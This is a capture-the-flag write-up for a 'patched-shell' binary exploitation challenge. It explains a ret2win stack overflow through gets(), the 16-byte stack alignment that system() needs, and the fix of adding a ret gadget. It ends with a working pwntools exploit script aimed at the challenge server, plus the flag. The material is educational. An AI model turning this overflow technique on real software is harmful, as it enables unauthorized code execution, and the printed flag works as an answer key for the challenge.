# patched-shell #

## Overview ##

Category: Binary Exploitation


Tags: `#Ret2win` `#Stack` `#Overflow` `#Write-What-Where` `#Underflow` `#Overwrite` `#Win` `#Flag` `#Pwntools` `#Ghidra` `#Checksec` `#Calling convention`

## Description ##

Okay, okay. So you were smart enough to do basic overflow huh...

Now try this challenge! I patched the shell function so 
it calls system instead of execve... so now your exploit 
shouldn't work! bwahahahahaha

nc 34.134.173.142 5000
## Approach ##

>**Note:** This challenge bears a strong resemblance to the basic-overflow challenge. If you are already familiar with that challenge and have read the corresponding write-up, feel free to skip ahead to the section discussing the specific problem at hand.

Began by disassembling the `patched-shell` binary 
within [Ghidra](https://ghidra-sre.org) and analysing the output.

Also checked the binary security with [pwntools](https://python3-pwntools.readthedocs.io/en/latest/index.html) `checksec` :

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

Upon examining the disassembled output, we encounter the main() function, which notably includes a call to gets(). This function is notorious for its security vulnerabilities, primarily because it lacks bounds checking for its input size. The relevant section of the code is as follows:

     undefined8 main(void)

      {
      char local_48 [64];
      gets(local_48);
      return 0;
      }

This usage of gets() immediately suggests that the program is susceptible to a buffer overflow attack. This vulnerability arises because gets() does not limit the amount of data read, potentially allowing more data than the allocated buffer size (local_48 in this case, which is 64 bytes) and thus overwriting adjacent memory.

As our analysis progresses, we also discover the shell() function. This function is evidently crafted to execute a shell, as indicated by its implementation:           
    
    void shell(void)

    {
      system("/bin/sh");
      return;
    }


    

This is a well-known attack called ret2win in order to trigger the shell function we must firstly overwrite the return address of main() with the address of shell().
That's why we need to find the address of shell() in the binary. We can do this by using Ghidra's symbol tree to search for the function name. The address of shell() is `0x0000000000401136`.
Our offset is 72 bytes(64 bytes for local_48 + 8 bytes for the saved base pointer). We can use pwntools to send the payload to the binary.

## Problem ##
If we attempt to execute the exploit previously utilized in the basic-overflow
challenge, we observe that it fails to open a shell, resulting in an EOF error
instead. The reason behind this failure is attributable to a patch applied to the
shell() function. Specifically, this patch modified the function by replacing
the execve() call with a system() call.

The system() function operates using SSE (Streaming SIMD Extensions) instructions,
which require the stack to be aligned to 16 bytes. In this scenario, however,
the stack is only aligned to 8 bytes. As a result, the system() function does
not execute as intended, since a 16-byte alignment is necessary for its
proper operation. The exploit would succeed if the stack 
alignment is adjusted to 16 bytes. 

The solution to this problem is actually quite simple. We can simply add a return instruction to the payload, which will align the stack to 16 bytes. This is because the return instruction will pop the return address from the stack, which is 8 bytes, and then pop the base pointer from the stack, which is another 8 bytes. This will align the stack to 16 bytes, which is the required alignment for the system() function to execute properly.
We can either use the return address of main() or the return address of shell() as the return instruction. In this case, we will use the return address of main() as the return instruction. The return address of main() is `0x000000000040116b`. We can use Ghidra's symbol tree to search for the function name. We can then use pwntools to send the payload to the binary. The final payload is as follows: 72 arbitrary bytes + return address of main() + address of shell().

  


## Solution ##


Final `pwntools` script used in the event :

    from pwn import*

    r=remote("34.134.173.142",5000)
    offset=72

    shell=p64(0x0000000000401136)
    ret=p64(0x000000000040116b)
    payload=b'A'*72+ret+shell


    r.sendline(payload)
    r.interactive()

After running the script, we can see that we have a shell. We can then use the `ls` command to list the files in the current directory, and `cat flag` to read the flag.


## Flag ##
`uoftctf{patched_the_wrong_function}`